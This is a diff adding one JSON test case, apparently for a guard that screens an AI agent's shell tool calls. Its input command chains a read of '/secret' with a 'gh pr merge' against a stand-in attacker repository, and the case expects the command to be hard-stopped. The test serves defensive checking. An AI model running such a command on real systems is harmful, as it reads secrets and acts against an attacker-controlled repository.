@@ -1,0 +1,14 @@
+{
+  "name": "gh-body-file-cannot-cover-sibling-read",
+  "call": {
+    "tool": "Bash",
+    "input": {
+      "command": "cat /secret; gh pr merge 1 -R evil.example/attacker/repo --squash --body-file /safe"
+    }
+  },
+  "expected": {
+    "kind": "gommage",
+    "hard_stop": true,
+    "matched_rule": "deny-ambiguous-shell-effects"
+  }
+}
